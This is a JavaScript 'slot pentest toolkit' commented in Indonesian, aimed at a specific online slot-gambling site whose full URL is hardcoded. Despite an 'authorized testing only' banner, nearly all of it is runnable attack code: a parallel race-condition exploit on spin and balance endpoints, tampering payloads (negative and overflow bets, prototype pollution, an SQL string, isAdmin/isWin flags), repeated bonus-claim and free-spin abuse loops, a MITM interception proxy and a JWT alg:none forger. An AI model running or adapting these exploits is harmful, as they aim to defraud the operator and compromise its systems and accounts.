// slot-pentest-toolkit.js
// ⚡ Authorized Security Testing Tool - Hanya untuk pentest legal ⚡

const axios = require('axios');
const crypto = require('crypto');
const fs = require('fs');
const https = require('https');

// ============================================================
// KONFIGURASI - SESUAIKAN DENGAN TARGET
// ============================================================
const CONFIG = {
    targetUrl: 'https://m.9ffyu1g9c.com/135/index.html?ot=A3CB3037-5CF9-31E5-04BB-B25926DA17F0&btt=1&ops=fh0OQoEhMm5aiUdG4PjtZ1LO2EXzEWMcw3YKjZiGoR3RWRfvo5oyDLtW7X03swVQzRbyol%2f5SOYS_DtCTvK7ZA%3d%3d&l=id&ao=14odw%3D6qhigzken%3Dqca&or=11deletn%3Dg2vjf1vuc%3Dnzx&__hv=2fMEUCIArqIPF45VBaCDC51jbM9byUk0r8qFdIXBXQpazAQj%2FiAiEA72wReCMZLOmamwvgMOMJTteSH66eSVevZdhyFkeBW2s%3D',
    endpoints: {
        spin: '/api/game/spin',
        bet: '/api/game/bet',
        bonus: '/api/game/bonus-claim',
        withdraw: '/api/wallet/withdraw',
        balance: '/api/wallet/balance'
    },
    auth: {
        token: 'YOUR_JWT_TOKEN_HERE',
        cookie: 'session=YOUR_SESSION_COOKIE'
    },
    game: {
        gameId: 'gates-of-olympus',
        betAmount: 1000,
        currency: 'IDR'
    },
    threads: 50  // Parallel request count
};

// ============================================================
// 1. RACE CONDITION EXPLOIT — Parallel requests
// ============================================================
async function raceConditionExploit() {
    console.log('[•] Menjalankan Race Condition Exploit...');
    
    const headers = {
        'Authorization': `Bearer ${CONFIG.auth.token}`,
        'Cookie': CONFIG.auth.cookie,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
    };

    // Spin request body
    const spinPayload = {
        gameId: CONFIG.game.gameId,
        bet: CONFIG.game.betAmount,
        currency: CONFIG.game.currency,
        nonce: Date.now().toString()
    };

    // Kirim banyak spin request secara paralel dalam milidetik yang sama
    const promises = [];
    for (let i = 0; i < CONFIG.threads; i++) {
        spinPayload.nonce = Date.now().toString() + '-' + i;
        promises.push(
            axios.post(`${CONFIG.targetUrl}${CONFIG.endpoints.spin}`, spinPayload, { 
                headers,
                timeout: 5000,
                httpsAgent: new https.Agent({ rejectUnauthorized: false })
            }).then(res => ({
                status: res.status,
                data: res.data,
                index: i
            })).catch(err => ({
                error: err.message,
                index: i
            }))
        );
    }

    const results = await Promise.all(promises);
    
    // Analisis hasil - cari anomaly
    const successCount = results.filter(r => r.status === 200).length;
    const duplicateNonces = results.filter(r => r.data && r.data.status === 'duplicate');
    const unexpectedBalances = results.filter(r => {
        return r.data && r.data.balance && r.data.balance > CONFIG.game.betAmount * 2;
    });

    console.log(`[+] Spin requests sent: ${CONFIG.threads}`);
    console.log(`[+] Success: ${successCount}`);
    console.log(`[+] Duplicate detected: ${duplicateNonces.length}`);
    console.log(`[+] Balance anomaly: ${unexpectedBalances.length}`);

    if (unexpectedBalances.length > 0) {
        console.log('[!] VULN DETECTED: Race condition pada balance!');
        console.log(unexpectedBalances.slice(0, 3));
    }

    return results;
}

// ============================================================
// 2. PARAMETER TAMPERING — Manipulasi request
// ============================================================
async function parameterTampering() {
    console.log('\n[•] Menjalankan Parameter Tampering...');
    
    const headers = {
        'Authorization': `Bearer ${CONFIG.auth.token}`,
        'Cookie': CONFIG.auth.cookie,
        'Content-Type': 'application/json'
    };

    const tamperTests = [
        // Negatif bet
        { name: 'Negative Bet', payload: { gameId: CONFIG.game.gameId, bet: -999999, currency: 'IDR' }},
        // Overflow bet
        { name: 'Overflow Bet', payload: { gameId: CONFIG.game.gameId, bet: 999999999999999999999, currency: 'IDR' }},
        // String di numeric field
        { name: 'String Injection', payload: { gameId: CONFIG.game.gameId, bet: 'DROP TABLE users', currency: 'IDR' }},
        // Currency manipulation
        { name: 'Currency Swap', payload: { gameId: CONFIG.game.gameId, bet: 1, currency: 'BTC' }},
        // JSON injection
        { name: 'JSON Injection', payload: { gameId: CONFIG.game.gameId, bet: CONFIG.game.betAmount, "__proto__": { "admin": true } }},
        // Array injection
        { name: 'Array Injection', payload: [CONFIG.game.gameId, CONFIG.game.betAmount, 'IDR']},
        // Null injection
        { name: 'Null Injection', payload: { gameId: CONFIG.game.gameId, bet: null, currency: null }},
        // Extra parameter
        { name: 'Extra Param', payload: { gameId: CONFIG.game.gameId, bet: CONFIG.game.betAmount, currency: 'IDR', isAdmin: true, isWin: true }},
    ];

    for (const test of tamperTests) {
        try {
            const res = await axios.post(
                `${CONFIG.targetUrl}${CONFIG.endpoints.spin}`,
                test.payload,
                { headers, timeout: 5000, validateStatus: () => true }
            );
            
            console.log(`[${res.status}] ${test.name}: ${JSON.stringify(res.data).substring(0, 100)}`);
            
            // Cek apakah response menunjukkan vulnerability
            if (res.data && (res.data.balance < 0 || res.data.error?.includes('sql') || res.status === 500)) {
                console.log(`[!] VULN DETECTED: ${test.name}`);
            }
        } catch (err) {
            console.log(`[ERR] ${test.name}: ${err.message}`);
        }
    }
}

// ============================================================
// 3. AUTO SPIN FLOODER + Nonce Analysis
// ============================================================
async function autoSpinAnalysis(spins = 100) {
    console.log(`\n[•] Mengumpulkan ${spins} sample spin untuk analisis...`);
    
    const headers = {
        'Authorization': `Bearer ${CONFIG.auth.token}`,
        'Cookie': CONFIG.auth.cookie,
        'Content-Type': 'application/json'
    };

    const results = [];
    let balance = null;

    for (let i = 0; i < spins; i++) {
        const nonce = Date.now().toString() + crypto.randomBytes(4).toString('hex');
        
        try {
            const res = await axios.post(
                `${CONFIG.targetUrl}${CONFIG.endpoints.spin}`,
                { gameId: CONFIG.game.gameId, bet: CONFIG.game.betAmount, currency: CONFIG.game.currency, nonce },
                { headers, timeout: 5000, validateStatus: () => true }
            );

            if (res.data) {
                results.push({
                    index: i,
                    nonce,
                    win: res.data.win || res.data.winAmount || 0,
                    balance: res.data.balance,
                    symbols: res.data.symbols || res.data.reels,
                    time: Date.now(),
                    raw: res.data
                });
                
                balance = res.data.balance || balance;
            }
        } catch (err) {
            // Skip rate limit errors
            if (i % 10 === 0) {
                console.log(`[~] Rate limited at spin ${i}, cooling...`);
                await sleep(1000);
            }
        }
    }

    // Statistik
    const totalBet = spins * CONFIG.game.betAmount;
    const totalWin = results.reduce((acc, r) => acc + (typeof r.win === 'number' ? r.win : 0), 0);
    const winCount = results.filter(r => r.win > 0).length;
    const maxWin = Math.max(...results.map(r => r.win));

    console.log(`\n========== ANALISIS STATISTIK ==========`);
    console.log(`Total Spin: ${spins}`);
    console.log(`Total Bet: ${totalBet}`);
    console.log(`Total Win: ${totalWin}`);
    console.log(`RTP: ${((totalWin / totalBet) * 100).toFixed(2)}%`);
    console.log(`Win Rate: ${((winCount / spins) * 100).toFixed(2)}%`);
    console.log(`Max Win: ${maxWin}`);
    console.log(`Current Balance: ${balance}`);

    // Cek anomaly
    const allNonces = results.map(r => r.nonce);
    const uniqueNonces = [...new Set(allNonces)];
    if (allNonces.length !== uniqueNonces.length) {
        console.log('[!] VULN: Duplicate nonce accepted!');
    }

    // Cek pola waktu
    const times = results.map(r => r.time);
    const intervals = [];
    for (let i = 1; i < times.length; i++) {
        intervals.push(times[i] - times[i-1]);
    }
    const avgInterval = intervals.reduce((a, b) => a + b, 0) / intervals.length;
    console.log(`Avg Response Time: ${avgInterval.toFixed(0)}ms`);

    // Simpan hasil untuk analisis lanjutan
    fs.writeFileSync('spin_results.json', JSON.stringify(results, null, 2));
    console.log('[+] Results saved to spin_results.json');

    return results;
}

// ============================================================
// 4. WEBHOOK INTERCEPTOR — Man-in-the-Middle Proxy
// ============================================================
function mitmProxy() {
    const http = require('http');
    const net = require('net');
    
    const PROXY_PORT = 8080;
    
    const server = http.createServer((req, res) => {
        console.log(`[>] ${req.method} ${req.url}`);
        console.log(`[>] Headers: ${JSON.stringify(req.headers)}`);
        
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            if (body) {
                console.log(`[>] Body: ${body}`);
                // Cari parameter menarik
                if (body.includes('bet') || body.includes('spin') || body.includes('win')) {
                    console.log('[!] Game request terdeteksi!');
                    
                    // Simpan ke file
                    fs.appendFileSync('intercepted.txt', 
                        `[${new Date().toISOString()}] ${req.url}\n${body}\n\n`);
                }
            }
        });
        
        // Forward request ke target asli
        const options = {
            hostname: new URL(CONFIG.targetUrl).hostname,
            port: 443,
            path: req.url,
            method: req.method,
            headers: req.headers
        };
        
        const proxyReq = https.request(options, proxyRes => {
            res.writeHead(proxyRes.statusCode, proxyRes.headers);
            proxyRes.pipe(res);
            
            let responseBody = '';
            proxyRes.on('data', chunk => responseBody += chunk);
            proxyRes.on('end', () => {
                console.log(`[<] ${proxyRes.statusCode}: ${responseBody.substring(0, 200)}`);
            });
        });
        
        if (body) proxyReq.write(body);
        proxyReq.end();
    });

    // Handle HTTPS CONNECT
    server.on('connect', (req, clientSocket, head) => {
        const [host, port] = req.url.split(':');
        
        const serverSocket = net.connect(port || 443, host, () => {
            clientSocket.write('HTTP/1.1 200 Connection Established\r\n\r\n');
            serverSocket.write(head);
            serverSocket.pipe(clientSocket);
            clientSocket.pipe(serverSocket);
        });
    });

    server.listen(PROXY_PORT, () => {
        console.log(`\n[★] MITM Proxy running on http://localhost:${PROXY_PORT}`);
        console.log('[★] Set proxy browser ke localhost:8080');
        console.log('[★] SSL certificate bypass mungkin diperlukan\n');
    });
}

// ============================================================
// 5. BONUS/CLAIM LOGIC FLAW TESTER
// ============================================================
async function bonusLogicExploit() {
    console.log('\n[•] Testing Bonus/Claim Logic...');
    
    const headers = {
        'Authorization': `Bearer ${CONFIG.auth.token}`,
        'Cookie': CONFIG.auth.cookie,
        'Content-Type': 'application/json'
    };

    // Test 1: Claim bonus berkali-kali
    console.log('[>] Test 1: Repeated bonus claim...');
    for (let i = 0; i < 10; i++) {
        try {
            const res = await axios.post(
                `${CONFIG.targetUrl}${CONFIG.endpoints.bonus}`,
                { bonusId: 'welcome-bonus', claimNonce: Date.now().toString() },
                { headers, timeout: 3000, validateStatus: () => true }
            );
            
            if (res.status === 200 && res.data.success) {
                console.log(`[!] VULN: Bonus claim #${i} accepted! (Harusnya ditolak setelah claim pertama)`);
            }
        } catch (e) {}
    }

    // Test 2: Modify bonus amount
    console.log('[>] Test 2: Bonus amount tampering...');
    try {
        const res = await axios.post(
            `${CONFIG.targetUrl}${CONFIG.endpoints.bonus}`,
            { 
                bonusId: 'welcome-bonus', 
                desiredAmount: 99999999,
                multiplier: 1000,
                __proto__: { credit: 999999 }
            },
            { headers, timeout: 3000, validateStatus: () => true }
        );
        console.log(`[${res.status}] Bonus tamper: ${JSON.stringify(res.data).substring(0, 100)}`);
    } catch (e) {}

    // Test 3: Free spin loop
    console.log('[>] Test 3: Free spin infinite loop...');
    let freeSpins = 0;
    for (let i = 0; i < 100; i++) {
        try {
            const res = await axios.post(
                `${CONFIG.targetUrl}${CONFIG.endpoints.spin}`,
                { gameId: CONFIG.game.gameId, bet: 0, isFreeSpin: true, currency: 'IDR', nonce: Date.now().toString() },
                { headers, timeout: 3000, validateStatus: () => true }
            );
            
            if (res.status === 200) {
                freeSpins++;
                if (res.data.freeSpinsRemaining > 0) {
                    console.log(`[!] VULN: Free spin loop detected! ${res.data.freeSpinsRemaining} remaining`);
                }
            }
        } catch (e) {
            break;
        }
    }
    console.log(`[+] Free spins claimed: ${freeSpins}`);
}

// ============================================================
// 6. JWT / AUTH TOKEN ATTACK
// ============================================================
function jwtAttack(token) {
    console.log('\n[•] Testing JWT Security...');
    
    // Decode JWT tanpa verifikasi
    const parts = token.split('.');
    if (parts.length === 3) {
        try {
            const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
            const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
            
            console.log(`[+] JWT Header: ${JSON.stringify(header)}`);
            console.log(`[+] JWT Payload: ${JSON.stringify(payload)}`);
            
            // Cek alg: none attack
            const modifiedHeader = { ...header, alg: 'none' };
            const modifiedToken = 
                Buffer.from(JSON.stringify(modifiedHeader)).toString('base64url') + '.' +
                parts[1] + '.';
            
            console.log(`[>] None Attack Token: ${modifiedToken.substring(0, 100)}...`);
            
            // Cek signature lemah
            const sig = parts[2];
            const decodedSig = Buffer.from(sig, 'base64url');
            if (decodedSig.length < 32) {
                console.log('[!] VULN: Weak JWT signature (< 256 bits)');
            }

            // Cek payload sensitif
            if (payload.admin || payload.isAdmin || payload.role === 'admin') {
                console.log('[!] INTERESTING: Admin field di JWT payload');
            }
        } catch (e) {
            console.log(`[ERR] JWT decode: ${e.message}`);
        }
    }
}

// ============================================================
// UTILITY
// ============================================================
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ============================================================
// MAIN EXECUTION
// ============================================================
async function main() {
    console.log(`
╔══════════════════════════════════════════════╗
║    SLOT PENTEST TOOLKIT v1.0                ║
║    Authorized Security Testing Only          ║
╚══════════════════════════════════════════════╝
    `);

    const args = process.argv.slice(2);
    const command = args[0] || 'help';

    switch (command) {
        case 'race':
            await raceConditionExploit();
            break;
        case 'tamper':
            await parameterTampering();
            break;
        case 'analyze':
            const count = parseInt(args[1]) || 100;
            await autoSpinAnalysis(count);
            break;
        case 'proxy':
            mitmProxy();
            break;
        case 'bonus':
            await bonusLogicExploit();
            break;
        case 'jwt':
            jwtAttack(CONFIG.auth.token);
            break;
        case 'all':
            console.log('[★] Running FULL TEST SUITE...\n');
            jwtAttack(CONFIG.auth.token);
            await parameterTampering();
            await raceConditionExploit();
            await autoSpinAnalysis(50);
            await bonusLogicExploit();
            console.log('\n[✓] Full test suite selesai. Cek hasil di console dan file.');
            break;
        default:
            console.log(`
Penggunaan: node slot-pentest-toolkit.js <command>

Commands:
  race      Test race condition pada spin/withdraw endpoint
  tamper    Test parameter injection dan tampering
  analyze   Kumpulkan sample spin untuk analisis statistik
  proxy     Jalankan MITM proxy untuk intercept traffic
  bonus     Test bonus/claim logic flaws
  jwt       Analisis JWT token security
  all       Jalankan semua test
            `);
    }
}

main().catch(console.error);
